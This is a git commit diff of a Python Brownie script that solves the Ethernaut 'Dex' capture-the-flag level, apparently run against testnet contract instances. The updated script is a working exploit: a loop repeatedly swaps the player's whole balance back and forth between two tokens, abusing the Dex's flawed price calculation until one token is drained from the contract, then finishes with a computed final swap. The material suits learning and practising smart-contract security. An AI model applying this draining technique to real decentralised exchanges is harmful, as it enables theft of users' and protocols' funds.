a9dbda84e7382161c9f5563de728615041bfa40a
sarobinson2001 <sarobinson2011@gmail.com>
2023-10-24 17:00:56 +0100

    level 22-Dex complete, updated 22-deploy_attack.py

--- scripts/22-deploy_attack.py
+++ scripts/22-deploy_attack.py
@@ -1,14 +1,15 @@
 from os import TMP_MAX
 from scripts.helpful_scripts import get_account
-from brownie import web3, interface, convert, Attack22, Dex
+from brownie import web3, interface, convert, Dex
 from eth_utils import keccak
 
 from scripts.sandbox import print_balances
 
 
-ETHERNAUT_INSTANCE = "0x57Bd513D776Faf277db7451583A03C3652F45c9C"
-TOKEN1 = "0x0e216B25a98Df058b4789cf60747317345B4c7F7"
-TOKEN2 = "0xF7942f7a505404DBdcFBd2874578b08A4eA29332"
+ETHERNAUT_INSTANCE = "0x058e398CDDc4D1756B5A5BE52F6D9f1c7F0a3D61"
+
+TOKEN1 = "0x1e292F2B859BED4E973161d157ee424dC05C2f51"
+TOKEN2 = "0xcA813159f75fC1bF890e139C647fa36aceA540aA"
 
 GAS_LIMIT = 12000000
 
@@ -41,47 +42,38 @@ def main():
     )
     print(f"\nprice = {price}\n")
 
-    """     swap stuff #1    """
-    target.swap(
-        token_from,
-        token_to,
-        token_from.balanceOf(player),
-        {"from": player, "gas_limit": GAS_LIMIT},
-    )
-    balances(target)
-    # toggle tokens
-    temp = token_to
-    token_to = token_from
-    token_from = temp
-    # get price for next swap
-    price = target.getSwapPrice(
-        token_from,
-        token_to,
-        token_from.balanceOf(player),
-        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
-    )
-    print(f"\nprice = {price}\n")
+    ################################################
+    # Swap loop
+    ################################################
+    while price <= token_from.balanceOf(target):
+        target.swap(
+            token_from,
+            token_to,
+            token_from.balanceOf(player),
+            {"from": player, "gas_limit": GAS_LIMIT},
+        )
+        balances(target)
+        print(f"player balance token_1 = {token1.balanceOf(player)}")
+        print(f"player balance token_2 = {token2.balanceOf(player)}")
 
-    """     swap stuff #2    """
-    target.swap(
-        token_from,
-        token_to,
-        token_from.balanceOf(player),
-        {"from": player, "gas_limit": GAS_LIMIT},
-    )
-    balances(target)
-    # toggle tokens
-    temp = token_to
-    token_to = token_from
-    token_from = temp
-    # get price for next swap
-    price = target.getSwapPrice(
-        token_from,
-        token_to,
-        token_from.balanceOf(player),
-        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
-    )
-    print(f"price = {price}")
+        # toggle tokens
+        temp = token_to
+        token_to = token_from
+        token_from = temp
+        # get price for next swap
+        price = target.getSwapPrice(
+            token_from,
+            token_to,
+            token_from.balanceOf(player),
+            {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
+        )
+        print(f"\nprice = {price}\n")
+
+    ################################################
+
+    amount = int(token_from.balanceOf(player) * token_to.balanceOf(target) / price)
+    price = target.getSwapPrice(token_from, token_to, amount)
+    target.swap(token_from, token_to, amount, {"from": player})
 
 
 """
@@ -92,8 +84,8 @@ def main():
         3) define token1 and token2
         4) approve token1 and token2
         
-        5) assign tokenTo and tokenFrom (so you can toggle them)
-            5a. assign tokenTo / tokenFrom
+        5) assign token_to and tokenFrom (so you can toggle them)
+            5a. assign token_to / tokenFrom
         
         6) get swap_price
 
@@ -122,7 +114,7 @@ def main():
     
         5. Swap process ->
 
-            - see 22-simulate_dex.py (this models the swap process)
+            - see 22-simulate_target.py (this models the swap process)
         
         6. We can beat this level with Python and an IDex interface
 
